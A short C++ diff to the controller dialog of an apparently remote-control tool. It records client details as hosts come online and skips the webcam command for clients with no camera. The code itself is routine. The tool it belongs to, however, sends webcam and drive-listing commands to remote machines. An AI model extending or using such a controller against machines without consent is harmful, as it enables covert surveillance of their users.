@@ -361,7 +361,8 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 	m_CList_Online.SetItemText(i, ONLINELIST_VERSION, ver);
 	m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, st);
 	m_CList_Online.SetItemText(i, ONLINELIST_CLIENTTYPE, tp.IsEmpty()?"DLL":tp);
-
+	CString data[10] = { strIP, strAddr,strPCName,strOS,strCPU,strVideo,strPing,ver,st,tp };
+	ContextObject->SetClientInfo(data);
 	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);
 
 	ShowMessage(true,strIP+"主机上线");
@@ -829,7 +830,10 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 	{
 		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
 		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
-
+		if (szBuffer[0]== COMMAND_WEBCAM && ContextObject->sClientInfo[ONLINELIST_VIDEO] == CString("无"))
+		{
+			continue;
+		}
 		// 发送获得驱动器列表数据包
 		m_iocpServer->OnClientPreSending(ContextObject,szBuffer, ulLength);
 	} 
